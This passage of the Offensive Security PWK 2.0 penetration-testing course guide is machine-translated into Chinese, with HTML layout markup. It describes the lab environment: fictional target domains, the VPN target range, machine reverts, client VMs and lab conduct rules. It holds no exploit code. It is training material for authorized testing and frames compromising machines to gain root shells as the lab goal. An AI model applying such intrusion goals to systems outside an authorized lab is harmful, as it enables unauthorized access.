<div style="position:absolute;top:25584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:25584;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将终身取消您参加任何进攻性安全课程和考试的资格</font></font></nobr></div>
<div style="position:absolute;top:25613;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:25613;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将终身取消您购买进攻性安全产品的资格</font></font></nobr></div>
<div style="position:absolute;top:25645;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © 2020 Offsec Services Ltd. 保留所有权利 — 本出版物/视频的任何部分不得</font></font></nobr></div>
<div style="position:absolute;top:25665;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被复制、发布、共享、再分发、再许可、传输、更改、用于创建</font></font></nobr></div>
<div style="position:absolute;top:25684;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未经 Offensive 事先书面许可，衍生作品或以任何其他方式利用</font></font></nobr></div>
<div style="position:absolute;top:25703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安全。</font></font></nobr></div>
<div style="position:absolute;top:25736;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以下文档包含本课程的实验室练习，仅应尝试</font></font></nobr></div>
<div style="position:absolute;top:25755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Offensive Security 托管的实验室环境中。</font><font style="vertical-align: inherit;">请注意，大多数攻击</font></font></nobr></div>
<div style="position:absolute;top:25775;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果在您没有明确说明的机器上尝试，实验室指南中描述的内容将是非法的</font></font></nobr></div>
<div style="position:absolute;top:25794;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许测试和攻击。</font><font style="vertical-align: inherit;">由于进攻性安全实验室环境与</font></font></nobr></div>
<div style="position:absolute;top:25813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Internet，在实验室内进行攻击是安全的。</font><font style="vertical-align: inherit;">Offensive Security 未授权您</font></font></nobr></div>
<div style="position:absolute;top:25833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在其自己的托管实验室环境之外执行这些攻击，并且不承担任何责任或</font></font></nobr></div>
<div style="position:absolute;top:25852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对任何此类行为的责任</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:25890;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.6 MegaCorpone.com 和 Sandbox.local 域</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:25931;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">megacorpone.com 域及其子域代表一家虚构的公司</font></font></nobr></div>
<div style="position:absolute;top:25951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由进攻性安全创建。</font><font style="vertical-align: inherit;">它有一个看似易受攻击的外部网络存在，即</font></font></nobr></div>
<div style="position:absolute;top:25970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">非常适合在整个课程中说明某些概念。</font></font></nobr></div>
<div style="position:absolute;top:26003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，此域可在内部 VPN 实验室网络之外访问，并且只能</font></font></nobr></div>
<div style="position:absolute;top:26022;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在课程练习期间用于被动和主动信息收集。</font><font style="vertical-align: inherit;">它是严格的</font></font></nobr></div>
<div style="position:absolute;top:26041;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">禁止主动尝试妥协。</font></font></nobr></div>
<div style="position:absolute;top:26074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sandbox.local 域代表一个虚构的公司内部网络，用于</font></font></nobr></div>
<div style="position:absolute;top:26093;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用本指南中涵盖的方法和技术演示完整的渗透测试</font></font></nobr></div>
<div style="position:absolute;top:26113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">课程。</font></font></nobr></div>
<div style="position:absolute;top:26146;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sandbox.local 域只能通过 VPN 作为您实验室访问的一部分进行访问。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:26311;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="23"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 23 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:26344;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:27421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:27421;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:27421;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:26440;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.7 关于PWK VPN实验室</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:26481;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 实验室提供了一个隔离环境，其中包含各种易受攻击的机器。</font></font></nobr></div>
<div style="position:absolute;top:26501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用实验室完成课程练习并练习课程中教授的技术</font></font></nobr></div>
<div style="position:absolute;top:26520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">材料。</font></font></nobr></div>
<div style="position:absolute;top:26553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下图是 PWK 实验室的简化图。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:27021;left:330"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 2：VPN 实验室的简化图</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:27052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完成课程视频和 PDF 实验室指南后，您将掌握基本技能</font></font></nobr></div>
<div style="position:absolute;top:27072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要渗透实验室中的大多数易受攻击的机器。</font><font style="vertical-align: inherit;">最初，您将通过 VPN 连接</font></font></nobr></div>
<div style="position:absolute;top:27091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到学生网络。</font><font style="vertical-align: inherit;">作为课程，您将侵入其他网络</font></font></nobr></div>
<div style="position:absolute;top:27110;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进展。</font><font style="vertical-align: inherit;">某些机器需要额外的研究和大量的决心</font></font></nobr></div>
<div style="position:absolute;top:27130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了让他们妥协。</font></font></nobr></div>
<div style="position:absolute;top:27162;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每台机器都包含一个 proof.txt 文件，作为您妥协的奖杯，但请保留在</font></font></nobr></div>
<div style="position:absolute;top:27182;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，目标不是专门找到 proof.txt 文件。</font><font style="vertical-align: inherit;">相反，您会想要尝试获得一个</font></font></nobr></div>
<div style="position:absolute;top:27201;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每台机器上的 root/SYSTEM 级交互式 shell。</font><font style="vertical-align: inherit;">有些机器可能还包含一个网络——</font></font></nobr></div>
<div style="position:absolute;top:27220;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.txt 文件。</font><font style="vertical-align: inherit;">您可以将该文件的内容提交到您的控制面板以解锁</font></font></nobr></div>
<div style="position:absolute;top:27240;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 IT、开发和管理中将虚拟机恢复到其原始状态的能力</font></font></nobr></div>
<div style="position:absolute;top:27259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">部门网络。</font></font></nobr></div>
<div style="position:absolute;top:27292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，本指南（和视频）中提供的 IP 地址不一定反映</font></font></nobr></div>
<div style="position:absolute;top:27311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击性安全实验室中的 IP 地址。</font><font style="vertical-align: inherit;">不要试图复制实验指南中的示例</font></font></nobr></div>
<div style="position:absolute;top:27331;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">逐个字符。</font><font style="vertical-align: inherit;">您需要根据您的特定实验室配置调整示例。</font></font></nobr></div>
<div style="position:absolute;top:27364;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您应该瞄准的机器是： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:27499;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="24"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 24 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:27532;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:28609;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:28609;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:28609;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:27629;left:283"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实验室</font></font></nobr></div>
<div style="position:absolute;top:27629;left:350"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子网</font></font></nobr></div>
<div style="position:absolute;top:27629;left:442"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标开始目标结束</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:27650;left:280"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 10.11.1.0/24</font></font></nobr></div>
<div style="position:absolute;top:27650;left:455"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.1</font></font></nobr></div>
<div style="position:absolute;top:27650;left:553"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.254</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:27670;left:334"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表 1 - 进攻性安全实验室目标范围</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:27700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您连接的实验室由许多不同的学生共享。</font><font style="vertical-align: inherit;">我们限制人数</font></font></nobr></div>
<div style="position:absolute;top:27719;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每个实验室的学生，以尽量减少有一个以上学生从事</font></font></nobr></div>
<div style="position:absolute;top:27738;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同一个目标机器并发。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:27773;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.7.1 实验室警告</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:27811;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内部 VPN 实验室网络是一个敌对环境，您不应存储敏感信息</font></font></nobr></div>
<div style="position:absolute;top:27830;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有关用于连接实验室的 Kali Linux 虚拟机的信息。</font><font style="vertical-align: inherit;">学生对学生 VPN</font></font></nobr></div>
<div style="position:absolute;top:27850;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交通是不允许的，但是，您可以通过停止服务来帮助保护自己</font></font></nobr></div>
<div style="position:absolute;top:27869;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有被使用，并确保您的 Kali Linux 上的任何默认密码都已更改</font></font></nobr></div>
<div style="position:absolute;top:27888;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:27923;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.7.2 控制面板</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:27960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦登录到内部 VPN 实验室网络，您就可以访问您的 PWK 控制面板。</font><font style="vertical-align: inherit;">PWK</font></font></nobr></div>
<div style="position:absolute;top:27980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制面板将帮助您恢复您的客户端和实验室机器或预订您的考试。</font></font></nobr></div>
<div style="position:absolute;top:28013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找到 network-secret.txt 文件后，您将使用控制面板，提交内容</font></font></nobr></div>
<div style="position:absolute;top:28032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件，并解锁恢复位于您发现的其他网络中的机器的能力。</font></font></nobr></div>
<div style="position:absolute;top:28065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">欢迎包电子邮件中列出了控制面板的 URL。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:28099;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.7.3 还原</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:28137;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每 24 小时为每位学生提供 12 次回复。</font><font style="vertical-align: inherit;">恢复使您能够返回一个</font></font></nobr></div>
<div style="position:absolute;top:28157;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将特定的实验室机器恢复到原始状态。</font><font style="vertical-align: inherit;">该计数器每天在格林威治标准时间 +0 的 00:00 重置。</font><font style="vertical-align: inherit;">如果你</font></font></nobr></div>
<div style="position:absolute;top:28176;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要额外的回复，您可以通过电子邮件联系学生管理员（help@offensive-</font></font></nobr></div>
<div style="position:absolute;top:28196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">security.com) 或联系 Live Support </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重置您的还原计数器。</font></font></nobr></div>
<div style="position:absolute;top:28228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实验室机器恢复之间的最短时间为五分钟。</font></font></nobr></div>
<div style="position:absolute;top:28261;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择下拉菜单还原实验室机器时，您将能够看到</font></font></nobr></div>
<div style="position:absolute;top:28280;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器最后恢复。</font><font style="vertical-align: inherit;">实验室中的一些机器将包含脚本</font></font></nobr></div>
<div style="position:absolute;top:28300;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动重启崩溃的服务或模拟用户操作。</font><font style="vertical-align: inherit;">这不是每个人的情况</font></font></nobr></div>
<div style="position:absolute;top:28319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统，但请在扫描或利用特定目标时考虑到这一点</font></font></nobr></div>
<div style="position:absolute;top:28338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font></font></nobr></div>
<div style="position:absolute;top:28371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们建议您在开始扫描和攻击机器之前恢复它，以确保</font></font></nobr></div>
<div style="position:absolute;top:28391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器及其服务按设计运行。</font><font style="vertical-align: inherit;">相反，一旦你完成了一个</font></font></nobr></div>
<div style="position:absolute;top:28410;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器，您也应该恢复它以删除攻击留下的任何工件，以便</font></font></nobr></div>
<div style="position:absolute;top:28430;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器不会处于被利用的状态。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:28559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://support.offensive-security.com</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:28687;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="25"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 25 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:28720;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:29797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:29797;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:29797;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:28816;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.7.4 客户端机器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:28854;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您将获得三台与课程一起使用的专用客户端计算机</font></font></nobr></div>
<div style="position:absolute;top:28873;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">材料和练习。</font><font style="vertical-align: inherit;">其中包括 Windows 10 客户端、Debian Linux 客户端和 Windows</font></font></nobr></div>
<div style="position:absolute;top:28892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器 2016 域控制器。</font></font></nobr></div>
<div style="position:absolute;top:28925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无论何时，您都需要通过学生控制面板恢复您希望使用的机器</font></font></nobr></div>
<div style="position:absolute;top:28945;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接到 VPN。</font><font style="vertical-align: inherit;">当您选择恢复 Windows 10 或 Windows Server 2016 时</font></font></nobr></div>
<div style="position:absolute;top:28964;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户，两台机器都将被恢复。</font><font style="vertical-align: inherit;">您分配的客户端机器会自动供电</font></font></nobr></div>
<div style="position:absolute;top:28983;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在您与 VPN 断开连接一段时间后关闭并恢复到初始状态</font></font></nobr></div>
<div style="position:absolute;top:29003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">时间。</font></font></nobr></div>
<div style="position:absolute;top:29035;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑到上述情况，我们强烈建议您不要将任何信息存储在您的任何</font></font></nobr></div>
<div style="position:absolute;top:29055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您不愿意丢失的客户端计算机。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:29089;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.7.5 Kali 虚拟机</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:29127;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们在课程中提供给您使用</font><font style="vertical-align: inherit;">的 VMware 映像</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 Kali 的默认 64 位版本</font></font></nobr></div>
<div style="position:absolute;top:29147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux。</font><font style="vertical-align: inherit;">我们建议您通过提供的 URL 下载和使用 VMware 映像</font></font></nobr></div>
<div style="position:absolute;top:29166;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过电子邮件发送的欢迎包。</font><font style="vertical-align: inherit;">虽然您可以自由使用 VirtualBox 或 Hyper-V 镜像，甚至</font></font></nobr></div>
<div style="position:absolute;top:29185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您自己的 Kali 安装，我们只能为提供的 VMware 映像提供支持。</font><font style="vertical-align: inherit;">这些</font></font></nobr></div>
<div style="position:absolute;top:29205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图片由 Offensive Security 提供，不受 Kali Linux 项目支持</font></font></nobr></div>
<div style="position:absolute;top:29224;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">团队。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:29259;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.7.6 实验室行为和实验室限制</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:29296;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进攻性安全实验室是一个共享环境。</font><font style="vertical-align: inherit;">请记住以下几点</font></font></nobr></div>
<div style="position:absolute;top:29316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">探索实验室：</font></font></nobr></div>
<div style="position:absolute;top:29349;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:29349;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">避免更改用户密码。</font><font style="vertical-align: inherit;">相反，如果可能，将新用户添加到系统中。</font><font style="vertical-align: inherit;">如果唯一</font></font></nobr></div>
<div style="position:absolute;top:29368;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进入机器的方法是更改​​密码，完成后请改回</font></font></nobr></div>
<div style="position:absolute;top:29387;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用那台特定的机器。</font></font></nobr></div>
<div style="position:absolute;top:29416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:29416;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦获得，您在计算机上禁用的任何防火墙规则都应恢复</font></font></nobr></div>
<div style="position:absolute;top:29435;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所需的访问级别。</font></font></nobr></div>
<div style="position:absolute;top:29463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:29463;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不要让机器处于不可利用的状态。</font></font></nobr></div>
<div style="position:absolute;top:29492;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:29492;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完成后，从机器中删除任何成功（和失败）的漏洞利用。</font><font style="vertical-align: inherit;">如果可能的话，</font></font></nobr></div>
<div style="position:absolute;top:29511;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建一个目录来存储您的漏洞利用。</font><font style="vertical-align: inherit;">这将最大限度地减少其他人的机会</font></font></nobr></div>
<div style="position:absolute;top:29530;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不小心使用你的漏洞攻击目标。</font></font></nobr></div>
<div style="position:absolute;top:29563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您可以通过记住在完成后还原每台机器来完成所有这些。</font></font></nobr></div>
<div style="position:absolute;top:29583;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要恢复机器，请使用学生控制面板。</font></font></nobr></div>
<div style="position:absolute;top:29615;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以下限制在内部 VPN 实验室网络中严格执行。</font><font style="vertical-align: inherit;">如果您违反任何</font></font></nobr></div>
<div style="position:absolute;top:29635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据以下限制，Offensive Security 保留禁用您的实验室访问权限的权利。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:29747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:29875;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="26"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 26 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:29908;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:30985;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:30985;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:30985;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">26</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:30004;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.不要进行ARP欺骗或进行任何其他类型的中毒或中间人攻击</font></font></nobr></div>
<div style="position:absolute;top:30023;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反对网络。</font></font></nobr></div>
<div style="position:absolute;top:30051;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 除非绝对必要，否则不要删除或重新定位任何关键的系统文件或提示</font></font></nobr></div>
<div style="position:absolute;top:30071;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特权升级。</font></font></nobr></div>
